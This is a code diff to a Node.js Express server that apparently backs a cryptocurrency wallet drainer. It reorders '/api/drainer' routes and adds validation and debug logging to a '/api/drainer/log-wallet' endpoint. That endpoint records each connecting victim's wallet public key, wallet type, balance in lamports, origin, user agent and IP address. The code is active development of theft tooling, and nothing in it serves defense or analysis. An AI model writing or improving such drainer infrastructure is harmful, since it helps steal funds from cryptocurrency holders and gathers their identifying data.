@@ -14,24 +14,20 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// API Routes
-app.get('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-app.post('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-app.options('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-// Wallet logging endpoint
+// API Routes - Specific routes first
 app.post('/api/drainer/log-wallet', async (req, res) => {
   try {
+    console.log('[SERVER] Received request body:', req.body);
+    console.log('[SERVER] Request headers:', req.headers);
+    
     const { publicKey, walletType, origin, userAgent, lamports } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    
+    // Validate required fields
+    if (!publicKey) {
+      console.error('[SERVER] Missing publicKey in request');
+      return res.status(400).json({ error: 'Missing publicKey' });
+    }
     
     console.log('[SERVER] Received wallet log request:', {
       publicKey: publicKey,
@@ -50,11 +46,25 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
       walletType: walletType || 'Unknown'
     });
     
+    console.log('[SERVER] Wallet logging successful');
     res.status(200).json({ success: true });
   } catch (error) {
-    console.error('Error logging wallet connection:', error);
-    res.status(500).json({ error: 'Failed to log wallet connection' });
+    console.error('[SERVER] Error logging wallet connection:', error);
+    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
   }
+});
+
+// Main drainer routes
+app.get('/api/drainer', async (req, res) => {
+  await drainerHandler(req, res);
+});
+
+app.post('/api/drainer', async (req, res) => {
+  await drainerHandler(req, res);
+});
+
+app.options('/api/drainer', async (req, res) => {
+  await drainerHandler(req, res);
 });
 
 // On-chain confirmation logging endpoint
